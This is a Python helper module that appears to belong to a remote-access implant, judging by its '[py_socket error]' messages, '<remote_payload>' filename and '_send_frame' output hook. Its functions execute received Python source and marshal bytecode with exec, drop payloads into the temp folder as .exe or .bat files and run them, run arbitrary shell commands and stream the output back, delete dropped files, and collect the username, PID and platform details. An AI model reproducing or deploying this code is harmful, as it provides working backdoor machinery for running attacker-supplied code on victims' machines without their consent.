# type: ignore

import base64
import hashlib
import marshal
import os
import platform
import subprocess
import sys
import tempfile
from contextlib import suppress


def hash_value(data: str | bytes) -> str:
    if isinstance(data, str):
        data = data.encode()

    return hashlib.sha256(data).hexdigest()


def decode_base64(data: str | bytes) -> bytes:
    if not data:
        return b""

    return base64.b64decode(data)


def encode_base64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def store_file(data: bytes, target_path: str = "") -> str:
    if not target_path:
        content_hash = hash_value(data)
        ext = ".exe" if sys.platform == "win32" and data.startswith(b"MZ") else (".bat" if sys.platform == "win32" else ".temp")
        target_path = os.path.join(tempfile.gettempdir(), f"{content_hash}{ext}")

    with open(target_path, "wb") as fh:
        fh.write(data)

    return target_path


def remove_file(target_path: str) -> None:
    with suppress(OSError):
        os.remove(target_path)


def execute_source(code: str, filename: str = "<remote_payload>") -> None:
    try:
        compiled = compile(code, filename, "exec")
        exec(compiled, globals())  # noqa: S102
    except (Exception, SystemExit) as exc:
        print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)


def execute_bytecode(data: bytes) -> None:
    try:
        code_obj = marshal.loads(data)
        exec(code_obj, globals())  # noqa: S102
    except (Exception, SystemExit) as exc:
        print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)


def execute_binary(filepath: str, *args: str, cleanup: bool = False) -> None:
    try:
        os.chmod(filepath, 0o700)
        proc = subprocess.Popen([filepath, *args], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S603
        send_fn = globals().get("_send_frame")

        while proc.stdout:
            chunk = proc.stdout.read(4096)

            if not chunk:
                break

            if send_fn:
                send_fn(1, chunk)
            else:
                sys.stdout.buffer.write(chunk)
                sys.stdout.buffer.flush()

        proc.wait()
    finally:
        if cleanup:
            remove_file(filepath)


def execute_system_command(command: str) -> None:
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602
    send_fn = globals().get("_send_frame")

    while proc.stdout:
        chunk = proc.stdout.read(4096)

        if not chunk:
            break

        if send_fn:
            send_fn(1, chunk)
        else:
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()

    proc.wait()


def label(title: str, content: str = "") -> None:
    heading = title.upper()
    separator = "-" * len(heading)

    print(f"\n{heading}\n{separator}")

    if content:
        print(content)


def format_table(headers: list, rows: list) -> str:
    all_rows = [headers] + [list(row) for row in rows]
    col_widths = [max(len(str(row[i])) for row in all_rows if i < len(row)) for i in range(len(headers))]

    lines = []

    for row in all_rows:
        cells = (str(row[i]).ljust(col_widths[i]) if i < len(row) else "".ljust(col_widths[i]) for i in range(len(headers)))
        lines.append("  ".join(cells).rstrip())

    return "\n".join(lines)


def get_system_summary() -> dict:
    return {
        "platform": platform.system(),
        "architecture": platform.machine(),
        "release": platform.release(),
        "python_version": sys.version.split()[0],
        "username": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
        "pid": os.getpid(),
    }
